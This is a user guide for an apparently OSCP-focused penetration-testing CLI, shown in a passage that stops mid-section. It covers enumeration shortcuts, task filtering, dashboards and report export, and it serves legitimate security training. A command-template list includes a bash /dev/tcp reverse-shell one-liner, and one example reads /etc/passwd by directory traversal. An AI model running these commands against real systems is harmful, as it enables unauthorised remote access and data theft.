# CRACK Track Interactive Mode - Complete Guide

## Table of Contents

1. [Overview](#1-overview)
2. [Quick Start](#2-quick-start)
3. [Core Concepts](#3-core-concepts)
4. [Keyboard Shortcuts Reference](#4-keyboard-shortcuts-reference)
5. [Tool Categories](#5-tool-categories)
   - 5.1 [Core UX Tools](#51-core-ux-tools)
   - 5.2 [Quick Win Tools](#52-quick-win-tools)
   - 5.3 [Medium Complexity Tools](#53-medium-complexity-tools)
   - 5.4 [Advanced Workflow Tools](#54-advanced-workflow-tools)
   - 5.5 [Expert Pattern-Matching Tools](#55-expert-pattern-matching-tools)
6. [OSCP Exam Workflows](#6-oscp-exam-workflows)
7. [Tool Integration Examples](#7-tool-integration-examples)
8. [Troubleshooting](#8-troubleshooting)
9. [Performance Tips](#9-performance-tips)
10. [Appendix: Command Reference](#10-appendix-command-reference)

---

## 1. Overview

CRACK Track Interactive Mode provides 18+ specialized tools for OSCP exam preparation, reducing enumeration time by 50-70% through automation, pattern recognition, and workflow optimization.

### Value Proposition

- ⚡ **50-70% faster enumeration** on 2nd+ targets
- 📊 **Data-driven optimization** (success rate analysis)
- 📝 **OSCP-compliant documentation** (source tracking)
- 🔄 **Repeatable workflows** (record/replay)
- ⏱️ **Time management** (time tracking + estimates)

### Zero Dependencies

Pure Python stdlib + existing CRACK infrastructure. Works in OSCP exam environment with no external dependencies.

### Design Philosophy

**"The best interface is no interface - but when you need one, it should feel like an extension of your thoughts, not a translation layer."**

Interactive mode adapts to your expertise level:
- **Beginner**: Full explanations and confirmations
- **Intermediate**: Smart confirmations, reduced prompts
- **Expert**: Minimal UI, maximum speed
- **Exam mode**: Optimized for OSCP time constraints

---

## 2. Quick Start

### 5-Minute Tutorial

#### Step 1: Start Interactive Mode
```bash
# Create new target profile
crack track new 192.168.45.100

# Enter interactive mode
crack track -i 192.168.45.100
```

#### Step 2: Import Scan Results
```bash
# Inside interactive mode
[crack-track] > import scan.xml
✓ Imported 3 ports: 22 (ssh), 80 (http), 445 (smb)
✓ Generated 15 service-specific tasks
```

#### Step 3: Use Quick Tools
```bash
# View progress dashboard
[crack-track] > pd
Progress: ████████............  40% (6/15 tasks)
  Completed: 6 | Pending: 9 | Failed: 0

# Filter tasks by port
[crack-track] > tf port:80
Found 5 tasks for port 80:
  1. whatweb-80        - Technology fingerprinting
  2. gobuster-80       - Directory brute-force
  3. nikto-80          - Vulnerability scan
  4. manual-http-80    - Manual inspection
  5. exploit-search-80 - CVE research

# Execute next recommended task
[crack-track] > n
Executing: whatweb http://192.168.45.100
[output...]
✓ Task completed
```

#### Step 4: Document Findings
```bash
# Quick note (no forms)
[crack-track] > qn Found admin panel at /dashboard with default creds
✓ Note added

# Add finding with source
[crack-track] > finding
Type: vulnerability
Description: SQL injection in id parameter
Source: Manual testing with sqlmap -u http://target/page?id=1
✓ Finding added
```

#### Step 5: Export for Report
```bash
# Export findings to markdown
[crack-track] > qx findings
✓ Exported 3 findings to findings_192.168.45.100.md

# Export full status
[crack-track] > qx status
✓ Exported complete status to status_192.168.45.100.md
```

---

## 3. Core Concepts

### 3.1 Session Persistence

**Auto-saves after every action** - Never lose progress even if session crashes.

**Storage Locations**:
- **Target profiles**: `~/.crack/targets/<TARGET>.json`
- **Session checkpoints**: `~/.crack/sessions/<TARGET>.json`
- **Workflow recordings**: `~/.crack/workflows/<NAME>.json`

**Resume Behavior**:
```bash
# Session interrupted? Just restart
crack track -i 192.168.45.100

# Output:
✓ Loaded profile for 192.168.45.100
✓ Restored session (last action: Completed gobuster-80)
```

### 3.2 Task Tree

**Hierarchical task organization** with dependency tracking:

```
Root: Enumeration 192.168.45.100
├── Discovery Phase
│   ├── Ping sweep (completed)
│   └── Port scan (completed)
├── Service Detection
│   ├── Nmap service scan (completed)
│   └── Version detection (completed)
└── Service-Specific Enumeration
    ├── HTTP (Port 80)
    │   ├── Technology fingerprinting (completed)
    │   ├── Directory brute-force (in-progress)
    │   ├── Vulnerability scan (pending)
    │   └── Manual checks (pending)
    └── SMB (Port 445)
        ├── Share enumeration (pending)
        └── User enumeration (pending)
```

**Task Status Flow**:
```
pending → in-progress → completed
                ↓
              failed → (can retry with 'tr')
```

### 3.3 Source Tracking

**OSCP Requirement**: All findings must have documented sources.

**Automatic Source Tracking**:
- Commands executed → Logged with output
- Findings added → Source required
- Credentials found → Source required
- Notes created → Timestamped with source

**Example**:
```json
{
  "finding": "Directory traversal in download.php",
  "source": "Manual testing: curl http://target/download.php?file=../../../etc/passwd",
  "timestamp": "2025-10-08T14:30:00"
}
```

### 3.4 Confirmation Modes

**Four modes to match your workflow**:

| Mode | Behavior | Use Case |
|------|----------|----------|
| `always` | Confirm every action | Beginner, learning phase |
| `smart` | Skip read-only tasks | **Recommended** - balance safety/speed |
| `never` | Execute without confirmation | Expert, time-critical exam |
| `batch` | Single confirmation for multiple tasks | Batch operations |

**Change mode**: Press `c` or use confirmation menu

---

## 4. Keyboard Shortcuts Reference

### Core Navigation
| Key | Action | Description |
|-----|--------|-------------|
| `h` | Help | Show all shortcuts and commands |
| `s` | Status | Show complete target status |
| `t` | Task tree | Display hierarchical task tree |
| `r` | Recommendations | Show next recommended tasks |
| `n` | Next task | Execute next recommended task |
| `b` | Back | Go back to previous menu |
| `q` | Quit | Save and exit interactive mode |

### Core UX Tools
| Key | Tool | Description |
|-----|------|-------------|
| `c` | Confirmation mode | Toggle confirmation behavior |
| `x` | Command templates | Quick OSCP command builder |
| `/` | Fuzzy search | Find tasks by name/keyword |

### Quick Win Tools (High Value, Low Effort)
| Key | Tool | Description | Time Saved |
|-----|------|-------------|------------|
| `qn` | Quick note | Add note without forms | ~30 sec/note |
| `tf` | Task filter | Filter by status/port/service/tags | ~1 min |
| `ch` | Command history | Browse and search command history | ~1 min |
| `pl` | Port lookup | OSCP port reference | ~30 sec |
| `tt` | Time tracker | Time management dashboard | N/A |

### Medium Complexity Tools
| Key | Tool | Description | Time Saved |
|-----|------|-------------|------------|
| `pd` | Progress dashboard | Visual progress overview | ~30 sec |
| `ss` | Session snapshot | Save/restore checkpoints | N/A |
| `qe` | Quick execute | Run command without task creation | ~1 min |
| `qx` | Quick export | Export to file/clipboard | ~2 min |
| `tr` | Task retry | Retry failed task with editing | ~2 min |

### Advanced Workflow Tools
| Key | Tool | Description | Time Saved |
|-----|------|-------------|------------|
| `be` | Batch execute | Multi-task execution | ~5 min |
| `fc` | Finding correlator | Identify attack chains | ~3 min |
| `sa` | Success analyzer | Task success rates | N/A |

### Expert Pattern-Matching Tools
| Key | Tool | Description | Time Saved |
|-----|------|-------------|------------|
| `wr` | Workflow recorder | Record/replay task sequences | ~20 min on 2nd+ target |
| `sg` | Smart suggest | Pattern-based suggestions | ~2 min |

---

## 5. Tool Categories

### 5.1 Core UX Tools

#### Smart Confirmation Mode
**Shortcut**: `c`
**Value**: Reduces confirmation prompts by 70%

**Purpose**: Skip unnecessary confirmations for read-only operations while maintaining safety for destructive actions.

**Modes**:
1. **Always** (Default) - Confirm every action
   - Best for: Beginners, learning CRACK Track
   - Confirmations: 100%

2. **Smart** (Recommended) - Skip read-only tasks
   - Best for: Intermediate users, exam prep
   - Confirmations: ~30%
   - Skips: Status checks, export operations, view commands
   - Confirms: Task execution, finding deletion, profile changes

3. **Never** (Expert) - Execute all tasks automatically
   - Best for: Experts, time-critical exam scenarios
   - Confirmations: 0%
   - ⚠️ Warning: No undo for destructive operations

4. **Batch** - Single confirmation for multiple tasks
   - Best for: Batch operations with `be` command
   - Confirmations: 1 per batch
   - Example: "Execute 5 tasks? [Y/n]"

**Usage**:
```bash
# Change confirmation mode
[crack-track] > c

Current mode: smart

Available modes:
  1. always - Always confirm (default)
  2. smart  - Skip read-only tasks (recommended)
  3. never  - Never confirm, execute all
  4. batch  - Single confirmation for batches

Select mode [1-4]: 2
✓ Smart mode enabled
```

**Pro Tips**:
- Start with `smart` mode for best balance
- Switch to `never` mode during exam time pressure
- Use `batch` mode with `be` for rapid enumeration
- Mode persists across sessions

---

#### Command Templates
**Shortcut**: `x`
**Value**: Pre-built OSCP commands with variable substitution

**Purpose**: Quick access to common OSCP commands with guided variable filling and flag explanations.

**Categories**:
- **Enumeration** (15 templates)
- **Web Testing** (12 templates)
- **Privilege Escalation** (10 templates)
- **File Transfer** (8 templates)
- **Exploitation** (7 templates)

**Example Templates**:
```
1. TCP Full Port Scan
   nmap -sS -p- --min-rate=1000 -oA <OUTPUT> <TARGET>

2. HTTP Directory Brute-force
   gobuster dir -u http://<TARGET> -w <WORDLIST> -o <OUTPUT>

3. SMB Share Enumeration
   smbclient -L //<TARGET> -N

4. Bash Reverse Shell
   bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
```

**Usage**:
```bash
# Open template menu
[crack-track] > x

Command Templates - Quick OSCP Commands
  1. TCP full port scan (Enumeration)
  2. HTTP directory brute-force (Web)
  3. SMB share enumeration (Enumeration)
  ...
  15. Bash reverse shell (Exploitation)

Template: 2

Template: HTTP Directory Brute-force
Fast directory enumeration with gobuster

Command template:
  gobuster dir -u http://<TARGET> -w <WORDLIST> -o <OUTPUT>

Flag Explanations:
  dir: Directory/file brute-forcing mode
  -u: Target URL
  -w: Wordlist path (use common.txt for speed)
  -o: Output file (required for OSCP documentation)

Estimated time: 2-5 minutes (depends on wordlist size)

Enter values for placeholders:
  <TARGET> (Target IP or hostname) [e.g., 192.168.45.100]: 192.168.45.100
  <WORDLIST> (Path to wordlist) [e.g., /usr/share/wordlists/dirb/common.txt]: /usr/share/wordlists/dirb/common.txt
  <OUTPUT> (Output file path) [e.g., gobuster-80.txt]: gobuster-80.txt

Final command:
  gobuster dir -u http://192.168.45.100 -w /usr/share/wordlists/dirb/common.txt -o gobuster-80.txt

Manual alternatives:
  • curl http://192.168.45.100/robots.txt
  • curl http://192.168.45.100/sitemap.xml
  • Browser: View page source for hidden directories

Success indicators:
  ✓ Directories found (Status: 200, 301, 302)
  ✓ Interesting paths (/admin, /upload, /backup)

Execute command? [y/N]: y
```

**Pro Tips**:
- Templates auto-fill from config where possible
- All commands include flag explanations (OSCP learning focus)
- Manual alternatives provided for exam scenarios
- Output automatically logged to profile

---

#### Fuzzy Search
**Shortcut**: `/`
**Value**: Find tasks instantly in large task trees

**Purpose**: Real-time fuzzy finding of tasks by name, ID, port, service, or tags.

**Search Modes**:
- **Fuzzy match**: Partial string matching
- **Regex**: Full regex support
- **Tag filter**: Search by OSCP tags
- **Port filter**: Filter by port number
- **Service filter**: Filter by service name

**Usage**:
```bash
# Fuzzy search for tasks
[crack-track] > /gobuster

Found 3 matches:
  1. gobuster-80     - Directory brute-force (Port 80)
  2. gobuster-8080   - Directory brute-force (Port 8080)
  3. gobuster-api-80 - API endpoint enumeration

Select task or refine search: 1

Task: gobuster-80
Status: pending
Command: gobuster dir -u http://192.168.45.100 -w /usr/share/wordlists/common.txt -o gobuster-80.txt

Actions:
  1. Execute task
  2. View details
  3. Edit command
  4. Back to search

Choice: 1
```

**Search Examples**:
```bash
/sql         # Find SQL-related tasks
/port:80     # All tasks for port 80
/tag:QUICK_WIN   # High-value quick tasks
/status:failed   # Failed tasks needing retry
/smb         # SMB enumeration tasks
```

**Pro Tips**:
- Search is case-insensitive
- Use `/status:pending` to see what's left
- Combine filters: `/port:80 status:pending`
- Results sorted by relevance

---

### 5.2 Quick Win Tools

#### Quick Note (qn)
**Shortcut**: `qn`
**Value**: Add notes without forms
**Time Saved**: ~30 seconds per note

**Purpose**: Capture thoughts and observations instantly without context switching to form-based entry.

**Usage**:
```bash
# Single-line note entry
[crack-track] > qn Found admin panel at /dashboard - default creds work (admin:admin)
✓ Note added: Found admin panel at /dashboard - default creds work (admin:admin)

# With custom source
[crack-track] > qn
Note: SQLi vulnerable parameter: id
Source [optional, press Enter for 'quick-note']: manual testing with sqlmap
✓ Note added
```

**Features**:
- Timestamped automatically
- Source defaults to 'quick-note' (can customize)
- Searchable in command history
- Exported in all output formats

**Integration**:
```bash
# Quick workflow: Test → Note → Continue
[crack-track] > qe curl http://target/admin
[output shows login panel]

[crack-track] > qn Admin panel found, testing default creds
✓ Note added

[crack-track] > qe curl -X POST -d "user=admin&pass=admin" http://target/admin/login
[success!]

[crack-track] > qn Admin access with admin:admin
✓ Note added
```

**Pro Tips**:
- Use for quick observations during manual testing
- Combine with `qe` for rapid test-and-document workflow
- Notes appear in timeline export for report
- Use descriptive notes - they're searchable later

---

#### Task Filter (tf)
**Shortcut**: `tf`
**Value**: Real-time task filtering
**Time Saved**: ~1 minute vs manual review

**Purpose**: Quickly isolate relevant tasks from large task trees using multiple filter criteria.

**Filter Types**:
```bash
# By status
tf status:pending    # All pending tasks
tf status:failed     # Failed tasks needing attention
tf status:completed  # Completed tasks for review

# By port
tf port:80          # All HTTP tasks
tf port:445         # All SMB tasks
tf port:3306        # All MySQL tasks

# By service
tf service:http     # HTTP/HTTPS tasks
tf service:smb      # SMB tasks
tf service:ssh      # SSH tasks

# By tags
tf tag:QUICK_WIN         # High-value quick tasks
tf tag:OSCP:HIGH         # High OSCP relevance
tf tag:MANUAL            # Manual testing tasks
tf tag:REQUIRES_AUTH     # Tasks needing credentials

# Combined filters
tf port:80 status:pending tag:QUICK_WIN
```

**Usage**:
```bash
[crack-track] > tf port:80 status:pending

Filtered Tasks (3 matches):
  1. gobuster-80       [pending] - Directory brute-force
  2. nikto-80          [pending] - Vulnerability scan
  3. manual-http-80    [pending] - Manual inspection

Actions:
  1. Execute all filtered tasks (batch)
  2. Execute task by number
  3. Export filtered list
  4. Clear filter

Choice: 1
Execute 3 tasks? [Y/n]: y
```

**Real-World Examples**:

**Exam Scenario 1**: "Show me quick wins only"
```bash
[crack-track] > tf tag:QUICK_WIN status:pending
Found 5 quick wins (est. total time: 15 minutes)
```

**Exam Scenario 2**: "What failed and needs fixing?"
```bash
[crack-track] > tf status:failed
Found 2 failed tasks - use 'tr' to retry with edits
```

**Exam Scenario 3**: "Focus on port 445"
```bash
[crack-track] > tf port:445
All SMB tasks (Port 445):
  1. enum4linux-445 [completed]
  2. smbclient-445  [pending]
  3. smbmap-445     [pending]
```

**Pro Tips**:
- Filter before batch execution with `be`
- Use `tf status:completed` to review what worked
- Combine `tf` with `qx` to export filtered results
- Save common filters as workflow steps with `wr`

---

#### Command History (ch)
**Shortcut**: `ch`
**Value**: Browse and reuse commands
**Time Saved**: ~1 minute vs retyping

**Purpose**: Searchable command history with fuzzy finding and re-execution.

**Features**:
- Complete command history across all sessions
- Fuzzy search by command content
- Filter by result (success/fail)
- Re-execute previous commands
- Export for documentation

**Usage**:
```bash
# View all command history
[crack-track] > ch

Command History (15 entries):
  1. [14:30] gobuster dir -u http://192.168.45.100 -w /usr/share/wordlists/common.txt  ✓
  2. [14:35] nikto -h http://192.168.45.100  ✓
  3. [14:40] curl http://192.168.45.100/admin  ✗
  4. [14:45] enum4linux -a 192.168.45.100  ✓
  ...

# Search history
[crack-track] > ch gobuster

Found 3 matches:
  1. [14:30] gobuster dir -u http://192.168.45.100 -w common.txt  ✓
  2. [15:00] gobuster dir -u http://192.168.45.100:8080 -w common.txt  ✓
  3. [15:15] gobuster dns -d target.com -w subdomains.txt  ✗

Select to re-execute or press 'e' to export: 1

Re-executing: gobuster dir -u http://192.168.45.100 -w common.txt
Modify command? [y/N]: n
```

**Filter by Result**:
```bash
# Show only successful commands
[crack-track] > ch --success

# Show only failed commands
[crack-track] > ch --failed
Found 2 failed commands - review and retry
```

**Export for Report**:
```bash
# Export all commands
[crack-track] > ch --export commands.txt
✓ Exported 15 commands to commands.txt

# Export successful commands only
[crack-track] > ch --success --export successful_commands.txt
```

**Pro Tips**:
- Use `ch --failed` to identify what needs retry
- Export commands for report methodology section
- Modify and re-execute with single keystroke
- History persists across sessions

---

#### Port Lookup (pl)
**Shortcut**: `pl`
**Value**: OSCP port reference
**Time Saved**: ~30 seconds vs web search

**Purpose**: Quick reference for common OSCP ports with enumeration commands and attack vectors.

**Database Includes**:
- 100+ common OSCP ports
- Service descriptions
- Enumeration commands
- Known vulnerabilities
- Default credentials
- Attack strategies

**Usage**:
```bash
# Lookup specific port
[crack-track] > pl 445

Port 445 - SMB (Server Message Block)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Description:
  Windows file sharing protocol. Common attack vector in OSCP.

Enumeration:
  • enum4linux -a <target>
  • smbclient -L //<target> -N
  • smbmap -H <target>
  • nmap --script smb-enum-shares,smb-enum-users <target>

Common Vulnerabilities:
  • EternalBlue (MS17-010) - Windows 7/2008
  • SMB signing disabled (relay attacks)
  • Null session enumeration
  • Anonymous share access

Default Credentials:
  • guest:(empty)
  • administrator:password

Attack Vectors:
  1. Enumerate shares → find writable share → upload payload
  2. Null session → enumerate users → brute force
  3. Exploit EternalBlue → SYSTEM shell
  4. Relay attack → compromise other hosts

Manual Testing:
  smbclient //<target>/<share> -N
  rpcclient -U "" <target>
  crackmapexec smb <target> --shares

OSCP Relevance: HIGH (appears in 80% of Windows targets)
```

**Quick Lookup**:
```bash
# List all HTTP ports
[crack-track] > pl http
Ports: 80, 443, 8000, 8080, 8443

# Common OSCP ports
[crack-track] > pl --common
  21  - FTP
  22  - SSH
  23  - Telnet
  25  - SMTP
  80  - HTTP
  110 - POP3
  139 - NetBIOS
  143 - IMAP
  443 - HTTPS
  445 - SMB
  3306 - MySQL
  3389 - RDP
```

**Pro Tips**:
- Use when encountering unfamiliar ports
- Copy enumeration commands directly
- Check for default credentials first
- Reference shows OSCP relevance rating

---

#### Time Tracker (tt)
**Shortcut**: `tt`
**Value**: Time management dashboard

**Purpose**: Track time spent on current target with task-level breakdowns and exam time awareness.

**Dashboard**:
```bash
[crack-track] > tt

Time Tracker Dashboard - 192.168.45.100
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Session Time: 1h 45m (started 14:00)
Exam Time Remaining: 2h 15m (if this were exam)

Time by Phase:
  Discovery:           15m  ████░░░░░░  (15%)
  Service Detection:   20m  █████░░░░░  (20%)
  Service Enumeration: 45m  ████████░░  (45%)
  Exploitation:        25m  ██████░░░░  (25%)

Time by Task:
  1. nmap-full-scan    15m  [completed]
  2. gobuster-80       18m  [completed]
  3. nikto-80          12m  [completed]
  4. manual-http       25m  [in-progress] ← Currently running
  5. enum4linux-445     0m  [pending]

Recommendations:
  ⚠️ Task 'manual-http' running >20 min - consider timeout
  ✓ Quick wins available: enum4linux (est. 3 min)

Actions:
  1. Stop current task timer
  2. View detailed breakdown
  3. Export time report
  4. Set exam countdown timer
```

**Auto-Timing**:
```bash
# Timers start/stop automatically with task execution
[crack-track] > execute gobuster-80
⏱ Started timer: gobuster-80 (14:30:00)
[command output...]
✓ Task completed
⏱ Stopped timer: gobuster-80 (duration: 18m 32s)
```

**Exam Mode**:
```bash
# Set exam countdown
[crack-track] > tt --exam-mode 240
✓ Exam countdown set: 4h 0m remaining

# Time tracker shows countdown
[crack-track] > tt
⏰ EXAM TIME: 3h 45m remaining
⚠️ Prioritize quick wins - time is limited!
```

**Pro Tips**:
- Use `tt` regularly to avoid time sinks
- Set exam countdown for realistic practice
- Export time report for post-exam review
- Identify which tasks take longest for optimization

---

### 5.3 Medium Complexity Tools

#### Progress Dashboard (pd)
**Shortcut**: `pd`
**Value**: Visual progress overview
**Time Saved**: ~30 seconds vs manual status check

**Purpose**: At-a-glance progress visualization with statistics and phase tracking.

**Dashboard Display**:
```bash
[crack-track] > pd

Progress Dashboard - 192.168.45.100
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Overall Progress
  ████████████░░░░░░░░  60% (12/20 tasks)

By Status:
  ✓ Completed:  12  ████████████░░░░░░░░  60%
  ⧗ In Progress: 1  █░░░░░░░░░░░░░░░░░░░   5%
  ○ Pending:     7  ███████░░░░░░░░░░░░░  35%
  ✗ Failed:      0  ░░░░░░░░░░░░░░░░░░░░   0%

By Phase:
  Discovery          ████████████████████ 100% (3/3)
  Service Detection  ████████████████████ 100% (2/2)
  Service Specific   ████████░░░░░░░░░░░░  47% (7/15)

By Port:
  Port 22 (SSH)      ████████████████████ 100% (2/2)
  Port 80 (HTTP)     ████████░░░░░░░░░░░░  50% (5/10)
  Port 445 (SMB)     ██░░░░░░░░░░░░░░░░░░  33% (1/3)

Quick Wins Available: 3 tasks (est. 10 minutes total)
  • enum4linux-445   [QUICK_WIN, OSCP:HIGH]
  • ssh-keyscan-22   [QUICK_WIN]
  • robots-txt-80    [QUICK_WIN, MANUAL]

Recommendations:
  → Execute quick wins for rapid progress
  → Port 445 needs attention (33% complete)
  → Use 'be' to batch execute pending tasks
```

**Detailed Breakdown**:
```bash
# View detailed statistics
[crack-track] > pd --detailed

Task Breakdown by Type:
  Enumeration:   8/10  80%  [2 pending]
  Exploitation:  2/5   40%  [3 pending]
  Manual:        2/5   40%  [3 pending]

Success Indicators:
  ✓ Services enumerated: 3/3
  ✓ Findings documented: 5
  ✓ Credentials found: 2
  ⚠ No exploitation attempts yet

Time Estimates:
  Completed tasks:  1h 30m
  Pending tasks:    45m (estimated)
  Total estimate:   2h 15m
```

**Export**:
```bash
# Export progress report
[crack-track] > pd --export progress.md
✓ Progress report exported to progress.md
```

**Pro Tips**:
- Use `pd` after importing scans to see workload
- Check progress regularly during enumeration
- Identify bottlenecks (low completion ports)
- Quick wins section shows best ROI tasks

---

#### Session Snapshot (ss)
**Shortcut**: `ss`
**Value**: Save/restore checkpoints

**Purpose**: Create named checkpoints before risky operations for instant rollback.

**Usage**:
```bash
# Create snapshot with descriptive name
[crack-track] > ss before-sqli-testing
✓ Snapshot created: before-sqli-testing (14:30:00)

# Continue working... something goes wrong

# List snapshots
[crack-track] > ss --list
Available snapshots:
  1. before-sqli-testing    (14:30:00) - 15 tasks, 3 findings
  2. after-initial-enum     (13:00:00) - 8 tasks, 1 finding
  3. clean-start            (12:00:00) - 3 tasks, 0 findings

# Restore snapshot
[crack-track] > ss --restore before-sqli-testing
⚠️ This will revert all changes since snapshot
Restore snapshot 'before-sqli-testing'? [y/N]: y
✓ Restored to snapshot: before-sqli-testing
```

**Auto-Snapshots**:
```bash
# System creates auto-snapshots before:
# - Batch executions
# - Workflow replay
# - Task retries
# - Profile imports

Auto-snapshot: pre-batch-execute-20251008-143000
```

**Snapshot Comparison**:
```bash
# Compare current state with snapshot
[crack-track] > ss --diff before-sqli-testing

Changes since 'before-sqli-testing':
  Tasks:
    + sqlmap-80         (added)
    + manual-sqli-80    (added)
    ~ gobuster-80       (completed)

  Findings:
    + SQL injection in id parameter (added)

  Credentials:
    + dbuser:Pass123!   (added)

Keep changes? [y/N]: y
```

**Pro Tips**:
- Snapshot before risky exploits
- Use descriptive names (what you're about to do)
- Compare snapshots to see progress
- Auto-snapshots provide safety net

---

#### Quick Execute (qe)
**Shortcut**: `qe`
**Value**: Run commands without task creation
**Time Saved**: ~1 minute per quick test

**Purpose**: Execute one-off commands without task tracking overhead.

**Usage**:
```bash
# Quick execution (no task created)
[crack-track] > qe curl http://192.168.45.100/admin
[output displayed]
✓ Command executed (not tracked)

# With output capture
[crack-track] > qe --capture curl http://192.168.45.100/robots.txt
[output displayed]
Save output to profile? [y/N]: y
✓ Output saved as note
```

**Use Cases**:

**Quick Testing**:
```bash
# Test hypothesis quickly
[crack-track] > qe nc -zv 192.168.45.100 1-100
```

**Credential Verification**:
```bash
# Test found credentials
[crack-track] > qe mysql -h 192.168.45.100 -u dbuser -p'Pass123!'
```

**Manual Exploration**:
```bash
# Quick curl commands
[crack-track] > qe curl -I http://192.168.45.100
[crack-track] > qe curl http://192.168.45.100/backup
```

**Shell Commands**:
```bash
# Any shell command
[crack-track] > qe cat exploit.py | grep -i password
[crack-track] > qe ls -la /tmp
```

**Difference from Normal Execution**:
```
Normal Task Execution:
  1. Create/select task
  2. Confirm execution
  3. Execute command
  4. Update task status
  5. Log to task tree
  Total: 5 steps, ~2 minutes

Quick Execute (qe):
  1. Execute command immediately
  Total: 1 step, ~10 seconds
```

**Pro Tips**:
- Use for quick hypothesis testing
- Great for credential validation
- Output can be saved retroactively
- Command logged in history (`ch`)
- Perfect for exam time pressure

---

#### Quick Export (qx)
**Shortcut**: `qx`
**Value**: Export to file/clipboard
**Time Saved**: ~2 minutes vs manual copy-paste

**Purpose**: Context-sensitive export for different use cases (reports, sharing, backup).

**Export Formats**:

**1. Findings Only**:
```bash
[crack-track] > qx findings

Exported to: findings_192.168.45.100.md

# Findings - 192.168.45.100

## Vulnerabilities
- **SQL Injection** (id parameter)
  - Source: Manual testing with sqlmap
  - Timestamp: 2025-10-08 14:30:00

## Credentials
- **MySQL Database**
  - Username: dbuser
  - Password: Pass123!
  - Source: config.php via LFI
  - Timestamp: 2025-10-08 15:00:00
```

**2. Full Status**:
```bash
[crack-track] > qx status

Exported to: status_192.168.45.100.md

# Status Report - 192.168.45.100

## Progress
- Completed: 12/20 tasks (60%)
- Findings: 5
- Credentials: 2

## Services
- Port 22: SSH (OpenSSH 7.4)
- Port 80: HTTP (Apache 2.4.41)
- Port 445: SMB (Samba 4.0)

## Task Tree
[complete task tree...]
```

**3. Command History**:
```bash
[crack-track] > qx commands

Exported to: commands_192.168.45.100.txt

# Command History - 192.168.45.100

2025-10-08 14:00:00 | nmap -sS -p- 192.168.45.100
2025-10-08 14:15:00 | gobuster dir -u http://192.168.45.100 -w common.txt
2025-10-08 14:30:00 | curl http://192.168.45.100/admin
...
```

**4. JSON Export (Machine-Readable)**:
```bash
[crack-track] > qx json

Exported to: profile_192.168.45.100.json

{
  "target": "192.168.45.100",
  "ports": {...},
  "findings": [...],
  "credentials": [...],
  "task_tree": {...}
}
```

**5. Timeline**:
```bash
[crack-track] > qx timeline

Exported to: timeline_192.168.45.100.md

# Timeline - 192.168.45.100

14:00 | Completed: Full port scan
14:15 | Completed: Service detection
14:30 | Finding: SQL injection in id parameter
14:45 | Credential: dbuser:Pass123! (MySQL)
15:00 | Completed: Gobuster directory scan
```

**Clipboard Support**:
```bash
# Export to clipboard (if xclip installed)
[crack-track] > qx findings --clipboard
✓ Findings copied to clipboard
```

**Pro Tips**:
- Use `qx findings` for report evidence section
- Use `qx commands` for methodology section
- Use `qx json` for automation/parsing
- Use `qx timeline` for chronological reporting
- Export early and often

---

#### Task Retry (tr)
**Shortcut**: `tr`
**Value**: Retry failed tasks with editing
**Time Saved**: ~2 minutes vs manual retry

**Purpose**: Quickly fix and retry failed tasks with inline command editing.

**Usage**:
```bash
# List failed tasks
[crack-track] > tr

Failed Tasks (2):
  1. gobuster-80     - Wordlist not found
  2. sqlmap-80       - Connection timeout

Select task to retry: 1

Task: gobuster-80
Original command:
  gobuster dir -u http://192.168.45.100 -w /wrong/path/wordlist.txt -o gobuster.txt

Error:
  Error: error on running gobuster: unable to connect to /wrong/path/wordlist.txt

Edit command? [Y/n]: y

# Opens inline editor
Edit: gobuster dir -u http://192.168.45.100 -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt
                                                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                                                         (corrected path)

Save changes? [Y/n]: y

Execute now? [Y/n]: y
⏱ Executing corrected command...
✓ Task completed successfully
✓ Marked as completed
```

**Smart Suggestions**:
```bash
# System suggests common fixes
[crack-track] > tr sqlmap-80

Task: sqlmap-80
Error: Connection timeout

Common fixes for timeout errors:
  1. Add --timeout=30 flag
  2. Use --threads=1 for slower connection
  3. Check if service is running

Apply suggestion #1? [y/N]: y

Updated command:
  sqlmap -u http://192.168.45.100/page.php?id=1 --timeout=30

Execute? [Y/n]: y
```

**Batch Retry**:
```bash
# Retry all failed tasks
[crack-track] > tr --all
Found 3 failed tasks
Review and retry each? [Y/n]: y

[walks through each failed task with edit opportunity]
```

**Pro Tips**:
- Use `tr` immediately when task fails
- System suggests common fixes based on error type
- Edit preserves flag explanations and metadata
- Failed task count shown in `pd` dashboard
- Combine with `tf status:failed` to find all failures

---

### 5.4 Advanced Workflow Tools

#### Batch Execute (be)
**Shortcut**: `be`
**Value**: Multi-task execution with dependencies
**Time Saved**: ~5 minutes vs individual execution

**Purpose**: Execute multiple tasks efficiently with automatic dependency resolution and parallel execution where possible.

**Basic Usage**:
```bash
# Execute tasks by number range
[crack-track] > be 1-5
Selected 5 tasks:
  1. whatweb-80
  2. gobuster-80
  3. nikto-80
  4. manual-http-80
  5. ssh-keyscan-22

Dependency analysis:
  • Parallel group 1: whatweb-80, ssh-keyscan-22 (no dependencies)
  • Sequential: gobuster-80 → nikto-80 (gobuster must complete first)
  • Sequential: manual-http-80 (depends on gobuster findings)

Execute 5 tasks (est. time: 15 minutes)? [Y/n]: y

⏱ Executing parallel group 1...
  ✓ whatweb-80 completed (2m 30s)
  ✓ ssh-keyscan-22 completed (30s)

⏱ Executing gobuster-80...
  ✓ gobuster-80 completed (8m 15s)

⏱ Executing nikto-80...
  ✓ nikto-80 completed (5m 00s)

⏱ Executing manual-http-80...
  ✓ manual-http-80 completed (3m 20s)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Batch Results:
  ✓ Success: 5/5 tasks
  ⏱ Total time: 15m 05s
  📊 Time saved: ~10 minutes (vs sequential)
```

**Advanced Selection**:
```bash
# Specific task IDs
[crack-track] > be 1,3,5,7

# By filter criteria
[crack-track] > be --filter "port:80 status:pending"
Found 7 pending tasks for port 80
Execute all? [Y/n]: y

# By tag
[crack-track] > be --tag QUICK_WIN
Found 4 quick win tasks (est. 10 minutes)
Execute all? [Y/n]: y

# All pending tasks
[crack-track] > be --all-pending
Found 12 pending tasks
⚠️ This will execute ALL pending tasks
Continue? [y/N]: y
```

**Dependency Resolution**:
```bash
# System automatically handles dependencies
Task dependencies detected:
